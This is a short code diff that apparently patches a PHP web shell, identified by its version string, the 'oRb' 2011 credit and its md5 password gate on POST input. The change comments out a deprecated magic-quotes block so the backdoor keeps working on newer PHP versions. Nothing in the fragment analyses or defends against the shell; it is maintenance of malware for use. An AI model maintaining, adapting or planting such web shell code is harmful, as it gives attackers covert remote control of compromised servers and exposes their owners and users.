@@ -35,13 +35,20 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 if (PHP_VERSION_ID < 70000)
 	@set_magic_quotes_runtime(0);
 @define('VERSION', '4.2.5');
-if(get_magic_quotes_gpc()) {
-	function stripslashes_array($array) {
-		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
-	}
-	$_POST = stripslashes_array($_POST);
+
+
+
+/* if(get_magic_quotes_gpc()) {
+    function stripslashes_array($array) {
+        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
+    }
+    $_POST = stripslashes_array($_POST);
     $_COOKIE = stripslashes_array($_COOKIE);
-}
+} */
+
+
+
+
 /* (С) 11.2011 oRb */
 if(!empty($▛)) {
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
